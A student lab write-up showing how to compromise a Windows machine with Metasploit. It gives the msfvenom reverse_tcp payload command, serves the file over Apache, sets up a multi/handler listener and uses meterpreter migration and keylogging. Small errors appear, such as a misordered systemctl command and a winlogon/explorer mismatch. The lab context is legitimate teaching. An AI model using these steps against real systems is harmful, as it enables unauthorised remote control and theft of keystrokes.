### NAME: JAYANI N
### REG NO: 212224100025

# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="885" height="570" alt="Screenshot 2026-05-20 083610" src="https://github.com/user-attachments/assets/0ea07221-8635-43d3-981e-155f82461bd4" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="652" height="408" alt="Screenshot 2026-05-20 083707" src="https://github.com/user-attachments/assets/d5ed57e0-3bd3-48f5-9024-135f660f3039" />


Check the status of apache2
## OUTPUT:

<img width="652" height="408" alt="Screenshot 2026-05-20 083707" src="https://github.com/user-attachments/assets/4495faad-f19f-4bd8-b91b-391ebe3ea5ae" />


Invoke msfconsole:
## OUTPUT:

<img width="670" height="400" alt="Screenshot 2026-05-20 083946" src="https://github.com/user-attachments/assets/d698bac7-c528-486c-b8a2-73ae5de022b2" />



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="840" height="547" alt="Screenshot 2026-05-20 084012" src="https://github.com/user-attachments/assets/0e4645c8-4c6f-483b-9906-4cfa4accebd4" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="791" height="577" alt="Screenshot 2026-05-20 084506" src="https://github.com/user-attachments/assets/e6309ecb-ba9d-457b-abd1-fb694a0b0b4b" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="791" height="577" alt="Screenshot 2026-05-20 084506" src="https://github.com/user-attachments/assets/a1120b59-40f2-4920-a5c4-2193ec0cb6a0" />


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="716" height="322" alt="Screenshot 2026-05-20 084743" src="https://github.com/user-attachments/assets/2eeee98d-59f8-455c-b20e-24f0819a7b8d" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:
<img width="797" height="685" alt="Screenshot 2026-05-20 084912" src="https://github.com/user-attachments/assets/f8b237a4-e706-43cf-8dfb-81b876a46347" />



Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:
<img width="797" height="685" alt="Screenshot 2026-05-20 084912" src="https://github.com/user-attachments/assets/42d5c0f9-9a10-4d97-90ac-751bbed3f966" />



On kali/parrot give the command exploit
## OUTPUT:
<img width="678" height="211" alt="Screenshot 2026-05-20 085024" src="https://github.com/user-attachments/assets/788b9a0b-71a4-4fe0-b30a-bedf858c85ae" />



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:
<img width="691" height="396" alt="Screenshot 2026-05-20 085335" src="https://github.com/user-attachments/assets/8e36e9e9-289e-44ae-bc91-5062cc7473d4" />



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:
<img width="716" height="443" alt="Screenshot 2026-05-20 085353" src="https://github.com/user-attachments/assets/f71e3ff4-ca31-4c09-99f3-ceac476ecbb2" />


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:
<img width="716" height="443" alt="Screenshot 2026-05-20 085353" src="https://github.com/user-attachments/assets/767edc79-1b85-498d-acbd-eded34b90e7b" />



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
<img width="791" height="238" alt="Screenshot 2026-05-20 085550" src="https://github.com/user-attachments/assets/fa249965-a91e-4d01-acf8-a01340edfda6" />




keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:
<img width="750" height="576" alt="Screenshot 2026-05-20 085536" src="https://github.com/user-attachments/assets/29884fb2-74b6-490f-bb5d-7dbbc313d92a" />
<img width="791" height="238" alt="Screenshot 2026-05-20 085550" src="https://github.com/user-attachments/assets/d9f3dc28-da7a-4eb3-9653-252a0e632733" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

